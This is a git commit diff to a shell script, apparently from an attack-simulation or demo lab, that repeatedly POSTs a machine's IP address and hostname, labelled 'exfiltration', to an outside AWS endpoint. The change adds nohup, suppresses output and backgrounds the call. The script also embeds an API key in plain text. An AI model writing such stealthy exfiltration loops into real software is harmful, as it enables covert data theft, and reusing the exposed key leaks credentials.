08fdcecd4ab4ca300c108770666d18f06b06e3e0
Markus Winkler <winkler.info@icloud.com>
2021-11-18 10:49:39 +0100

    test

--- dotter_exfiltration.sh
+++ dotter_exfiltration.sh
@@ -1,7 +1,7 @@
 n=1
 while [ $n -le 12 ]  
 do
-  curl -X POST https://y1of9z8y16.execute-api.eu-west-1.amazonaws.com/default/moadsd-ng-reporter?TableName=moadsd-ng-reporter \
+  nohup curl -X POST https://y1of9z8y16.execute-api.eu-west-1.amazonaws.com/default/moadsd-ng-reporter?TableName=moadsd-ng-reporter \
   -H "Content-Type: application/json" \
   -H "x-api-key: kP8LCEmbtg8VBAblGh0nq5ENndRZCbvQ4Rgso1a6" \
   -d "{
@@ -10,9 +10,9 @@ do
       \"datetime\": {\"S\": \"$(date +%Y-%m-%d-%H-%M-%S)\" },
       \"admin_email\": {\"S\": \"c1rs@tm.com\" },
       \"action\": {\"S\": \"exfiltration\" },
-      \"type\": {\"S\": \"$(hostname -i)\" }
+      \"type\": {\"S\": \"$(hostname -i) $(hostname)\" }
     }
-  }"
+  }" > /dev/null 2>&1 /dev/null &
   sleep 5
   n=$(( n+1 ))
 done
